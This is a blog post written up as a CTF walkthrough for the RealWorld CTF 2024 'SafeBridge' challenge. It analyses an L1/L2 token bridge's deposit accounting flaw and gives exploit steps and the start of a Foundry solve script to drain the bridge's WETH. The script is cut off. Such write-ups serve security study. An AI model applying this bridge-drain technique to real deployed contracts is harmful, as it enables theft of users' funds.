<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) realworld CTF 2024 writeup (SafeBridge)" /><meta property="og:locale" content="kr" /><meta name="description" content="web3 newbie’s solver for SafeBridge in rwctf 2024" /><meta property="og:description" content="web3 newbie’s solver for SafeBridge in rwctf 2024" /><link rel="canonical" href="http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/" /><meta property="og:url" content="http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-01-30T17:02:13+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) realworld CTF 2024 writeup (SafeBridge)" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"web3 newbie’s solver for SafeBridge in rwctf 2024","url":"http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/","@type":"BlogPosting","headline":"(CTF) realworld CTF 2024 writeup (SafeBridge)","dateModified":"2024-01-31T18:42:26+09:00","datePublished":"2024-01-30T17:02:13+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/(ctf)-2024-realworldctf/"},"@context":"https://schema.org"}</script><title>(CTF) realworld CTF 2024 writeup (SafeBridge) | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) realworld CTF 2024 writeup (SafeBridge)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) realworld CTF 2024 writeup (SafeBridge)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2024-01-30 17:02:13 +0900" data-toggle="tooltip" data-placement="bottom" title="Tue, Jan 30, 2024, 5:02 PM +0900" >Jan 30, 2024</em> </span> <span> Updated <em class="timeago" date="2024-01-31 18:42:26 +0900 " data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 31, 2024, 6:42 PM +0900" >Jan 31, 2024</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1204 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>web3 newbie’s solver for SafeBridge in rwctf 2024</p><h2 id="objective"><strong>Objective</strong><a href="#objective" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Drain the <strong><code class="language-plaintext highlighter-rouge">BRIDGE</code></strong> (L1ERC20Bridge) of its WETH balance.</p><h2 id="setup"><strong>Setup</strong><a href="#setup" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>The challenge setup is using the <code class="language-plaintext highlighter-rouge">challenge.py</code> file, with <code class="language-plaintext highlighter-rouge">relayer.py</code> also running in the background.</p><p>There appear to be two instances each of l1 and l2, with each instance holding 1000 ether.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">action</span><span class="err">?</span> <span class="mi">1</span>
<span class="n">creating</span> <span class="n">private</span> <span class="n">blockchain</span><span class="p">...</span>
<span class="n">deploying</span> <span class="n">challenge</span><span class="p">...</span>

<span class="n">your</span> <span class="n">private</span> <span class="n">blockchain</span> <span class="n">has</span> <span class="n">been</span> <span class="nb">set</span> <span class="n">up</span>
<span class="n">it</span> <span class="n">will</span> <span class="n">automatically</span> <span class="n">terminate</span> <span class="ow">in</span> <span class="mi">1440</span> <span class="n">seconds</span>
<span class="o">---</span>
<span class="n">rpc</span> <span class="n">endpoints</span><span class="p">:</span>
    <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">47.251</span><span class="p">.</span><span class="mf">56.125</span><span class="p">:</span><span class="mi">8545</span><span class="o">/</span><span class="n">pmHYxNUDhqdMRFkcBhvEeMVm</span><span class="o">/</span><span class="n">l1</span>
    <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">47.251</span><span class="p">.</span><span class="mf">56.125</span><span class="p">:</span><span class="mi">8545</span><span class="o">/</span><span class="n">pmHYxNUDhqdMRFkcBhvEeMVm</span><span class="o">/</span><span class="n">l2</span>
<span class="n">private</span> <span class="n">key</span><span class="p">:</span>        <span class="mh">0x89fbaf7272d5f581e07ec0315d3be44906ff75ebfbd953528e3874351d8230a6</span>
<span class="n">challenge</span> <span class="n">contract</span><span class="p">:</span> <span class="mh">0x723516b4d13F4D5E7Cc4bCd6ccE9f6eb584da5e6</span>

</pre></table></code></div></div><p>The setup is configured as shown above.</p><h3 id="challengepy"><strong>challenge.py</strong><a href="#challengepy" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Let’s start by examining the challenge setup:</p><ol><li>Deployment is done via the Deploy.s.sol script.<ul><li>2 ether is approved for L1ERC20Bridge followed by a call to depositERC20.<li>This action transfers WETH to L1ERC20Bridge and triggers a message to call L2ERC20Bridge.finalizeDeposit. More on this later.</ul><li>A precompiled contract is deployed:</ol><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">library</span> <span class="n">Lib_PredeployAddresses</span> <span class="p">{</span>
    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_CROSS_DOMAIN_MESSENGER</span> <span class="o">=</span> <span class="mh">0x420000000000000000000000000000000000CAFe</span><span class="p">;</span>
    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_ERC20_BRIDGE</span> <span class="o">=</span> <span class="mh">0x420000000000000000000000000000000000baBe</span><span class="p">;</span>
    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_WETH</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="mh">0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000</span><span class="p">);</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Next, we’ll delve into the token transfer method by examining the <code class="language-plaintext highlighter-rouge">relayer.py</code> file.</p><h3 id="relayerpy"><strong>relayer.py</strong><a href="#relayerpy" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">Thread</span><span class="p">(</span>
    <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">_relayer_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">l1</span><span class="p">,</span> <span class="n">l1_messenger</span><span class="p">,</span> <span class="n">l2_messenger</span><span class="p">)</span>
<span class="p">).</span><span class="n">start</span><span class="p">()</span>
<span class="n">Thread</span><span class="p">(</span>
    <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">_relayer_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">l2</span><span class="p">,</span> <span class="n">l2_messenger</span><span class="p">,</span> <span class="n">l1_messenger</span><span class="p">)</span>
<span class="p">).</span><span class="n">start</span><span class="p">()</span>

</pre></table></code></div></div><p>Workers operate on l1_messenger and l2_messenger respectively.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_relayer_worker</span><span class="p">(</span>
    <span class="bp">self</span><span class="p">,</span> <span class="n">src_web3</span><span class="p">:</span> <span class="n">Web3</span><span class="p">,</span> <span class="n">src_messenger</span><span class="p">:</span> <span class="n">Contract</span><span class="p">,</span> <span class="n">dst_messenger</span><span class="p">:</span> <span class="n">Contract</span>
<span class="p">):</span>
    <span class="n">_src_chain_id</span> <span class="o">=</span> <span class="n">src_web3</span><span class="p">.</span><span class="n">eth</span><span class="p">.</span><span class="n">chain_id</span>
    <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">latest_block_number</span> <span class="o">=</span> <span class="n">src_web3</span><span class="p">.</span><span class="n">eth</span><span class="p">.</span><span class="n">block_number</span>
            <span class="k">if</span> <span class="n">_last_processed_block_number</span> <span class="o">&gt;</span> <span class="n">latest_block_number</span><span class="p">:</span>
                <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="n">latest_block_number</span>

            <span class="k">print</span><span class="p">(</span>
                <span class="sa">f</span><span class="s">"chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s"> syncing </span><span class="si">{</span><span class="n">_last_processed_block_number</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">latest_block_number</span><span class="si">}</span><span class="s">"</span>
            <span class="p">)</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span>
                <span class="n">_last_processed_block_number</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">latest_block_number</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="p">):</span>
                <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="n">i</span>
                <span class="n">logs</span> <span class="o">=</span> <span class="n">src_messenger</span><span class="p">.</span><span class="n">events</span><span class="p">.</span><span class="n">SentMessage</span><span class="p">().</span><span class="n">get_logs</span><span class="p">(</span>
                    <span class="n">fromBlock</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">toBlock</span><span class="o">=</span><span class="n">i</span>
                <span class="p">)</span>
                <span class="k">for</span> <span class="n">log</span> <span class="ow">in</span> <span class="n">logs</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s"> got log </span><span class="si">{</span><span class="n">src_web3</span><span class="p">.</span><span class="n">to_json</span><span class="p">(</span><span class="n">log</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                    <span class="k">try</span><span class="p">:</span>
                        <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">dst_messenger</span><span class="p">.</span><span class="n">functions</span><span class="p">.</span><span class="n">relayMessage</span><span class="p">(</span>
                            <span class="n">log</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="s">"target"</span><span class="p">],</span>
                            <span class="n">log</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="s">"sender"</span><span class="p">],</span>
                            <span class="n">log</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="s">"message"</span><span class="p">],</span>
                            <span class="n">log</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="s">"messageNonce"</span><span class="p">],</span>
                        <span class="p">).</span><span class="n">transact</span><span class="p">()</span>

                        <span class="n">dst_messenger</span><span class="p">.</span><span class="n">w3</span><span class="p">.</span><span class="n">eth</span><span class="p">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
                        <span class="k">print</span><span class="p">(</span>
                            <span class="sa">f</span><span class="s">"chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s"> relay message hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s"> src block number: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span>
                        <span class="p">)</span>
                        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">traceback</span><span class="p">.</span><span class="n">print_exc</span><span class="p">()</span>
            <span class="k">pass</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>The worker checks src events every second and then calls relayMessage on the destination.</p><h2 id="analysis"><strong>Analysis</strong><a href="#analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="l1l2-token-deposit"><strong>L1→L2 Token Deposit</strong><a href="#l1l2-token-deposit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li><strong>WETH Deposit &amp; Approval</strong><li><strong>Calling L1Bridge::depositERC20(weth,l2_weth,amount)</strong><ul><li>Transfers tokens from msg.sender to the bridge.<li>If l1token == weth, it triggers <strong><code class="language-plaintext highlighter-rouge">L2bridge:finalizeDeposit(0,l2_weth,from,to,amount)</code></strong>.<li>Otherwise, it triggers <strong><code class="language-plaintext highlighter-rouge">L2bridge:finalizeDeposit(l1token,l2token,from,to,amount)</code></strong>.<li>This sends a message to L2TokenBridge and updates <strong><code class="language-plaintext highlighter-rouge">deposits[l1token][l2token]</code></strong>.<li>A problem arises when l1token→weth and l2token→other token.<li>The deposit on L2 is made to L2_WETH, but the record in deposits is to the address of the other token.</ul><li><strong>Relayer Acceptance</strong><ul><li>Checks L1 events and calls relayMessage on L2.<li>Hashes the calldata, sets xDomainMessageSender → msg.sender, and then calls.<li>In finalizeDeposit, checks if it is L1TokenBridge and then mints L2token.</ul></ol><h3 id="l2l1-token-withdrawal"><strong>L2→L1 Token Withdrawal</strong><a href="#l2l1-token-withdrawal" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li><strong>Burn L2token</strong><li><strong>Encode Message</strong><ul><li>If L2Token==L2_WETH, it triggers <strong><code class="language-plaintext highlighter-rouge">L1Bridge::finalizeWethWithdrawal(from,to,amount)</code></strong>.<li>Otherwise, it triggers <strong><code class="language-plaintext highlighter-rouge">L1Bridge::finalizeERC20Withdrawal(L1token,L2token,from,to,amount)</code></strong>.</ul><li><strong>Relayer Acceptance</strong><ul><li>Checks L2 events and calls relayMessage on L1.<li><strong><code class="language-plaintext highlighter-rouge">finalizeERC20Withdrawal</code></strong> reduces <strong><code class="language-plaintext highlighter-rouge">deposits[l1token][l2token]</code></strong>.<li>Executes <strong><code class="language-plaintext highlighter-rouge">IERC20(L1Token).safeTransfer(to,amount)</code></strong>.</ul></ol><h3 id="current-balance-situation"><strong>Current Balance Situation</strong><a href="#current-balance-situation" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-markdown highlighter-rouge"><div class="code-header"> <span label-text="Markdown"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gh"># L1_weth</span>
L1Bridge: 2 ether

<span class="gh"># deposits</span>
L1_weth → L2_weth: 2 ether

<span class="gh"># L2_weth</span>
L2Bridge: 2 ether
</pre></table></code></div></div><h3 id="potential-race-condition"><strong>Potential Race Condition?</strong><a href="#potential-race-condition" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Race conditions seem unlikely, but could they be a factor? The worker checks for events in the block, waits 1 second per event, and remains pending until the transaction finalizes. Could disrupting the sync create a race condition?</p><ul><li>The sendMessage function allows arbitrary calls (msg.sender = crossDomainMessenger), but finalizeERC20Withdrawal and deposits aren’t possible.<li>What about using a fakeL1/L2 token? This could extend beyond just the L1weth ↔ L2weth pair to include L1weth ↔ L2fake.</ul><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">_target</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">_message</span><span class="p">);</span>
</pre></table></code></div></div><p>Can we interact with the token using this part of relayMessage (msg.sender = relayer)? It seems unrelated to tokens.</p><h2 id="root-cause"><strong>Root Cause</strong><a href="#root-cause" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">_initiateERC20Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
    <span class="k">internal</span>
<span class="p">{</span>
    <span class="n">IERC20</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">).</span><span class="n">safeTransferFrom</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>

    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">message</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_l1Token</span> <span class="o">==</span> <span class="n">weth</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSelector</span><span class="p">(</span>
            <span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">message</span> <span class="o">=</span>
            <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSelector</span><span class="p">(</span><span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">sendCrossDomainMessage</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
    <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">=</span> <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">+</span> <span class="n">_amount</span><span class="p">;</span>

    <span class="k">emit</span> <span class="n">ERC20DepositInitiated</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The <strong><code class="language-plaintext highlighter-rouge">_initateERC20Deposit</code></strong> function behaves in a specific way:</p><ul><li>Regardless of the L2 token, if the L1 token is weth, the event message sent to L2 will make the deposit to L2:WETH. However, a different L2 token can be recorded in the deposits mapping storage.<li>Deploying a fakeL2 token on L2 and giving the user enough of that token allows for manipulation</ul><h2 id="exploit"><strong>Exploit</strong><a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><strong>[L2]</strong> Create a fake L2 token.<li><strong>[L1]</strong> Send L1_weth → L2_fake (effectively sending L1_weth → L2_weth).<li><strong>[L2]</strong> Withdraw L2_weth → L1_weth (2 ether).<li><strong>[L2]</strong> Withdraw L2_fake → L1_weth (2 ether).</ol><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
</pre><td class="rouge-code"><pre><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span><span class="n">console2</span><span class="p">}</span> <span class="n">from</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>

<span class="k">import</span> <span class="s">"src/L1/WETH.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/L1/L1CrossDomainMessenger.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/L1/L1ERC20Bridge.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/Challenge.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/L2/standards/L2StandardERC20.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/L2/L2ERC20Bridge.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="n">Lib_PredeployAddresses</span><span class="p">}</span> <span class="n">from</span> <span class="s">"src/libraries/constants/Lib_PredeployAddresses.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="n">ERC20</span><span class="p">}</span> <span class="n">from</span> <span class="s">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"src/L2/standards/IL2StandardERC20.sol"</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="n">ERC20</span><span class="p">}</span> <span class="n">from</span> <span class="s">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">Solve</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    <span class="n">L2Fake</span> <span class="n">fake</span><span class="p">;</span>
    <span class="n">Challenge</span> <span class="n">challenge</span><span class="p">;</span>
    <span class="n">L1ERC20Bridge</span> <span class="n">l1Bridge</span><span class="p">;</span>
    <span class="n">WETH</span> <span class="n">weth</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>

    <span class="k">function</span> <span class="n">get_info</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"msg.sender"</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
        <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"CHALLENGE"</span><span class="p">));</span>
        <span class="n">l1Bridge</span> <span class="o">=</span> <span class="n">L1ERC20Bridge</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">BRIDGE</span><span class="p">());</span>
        <span class="n">weth</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">WETH</span><span class="p">())));</span>
        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"challenge"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">challenge</span><span class="p">));</span>
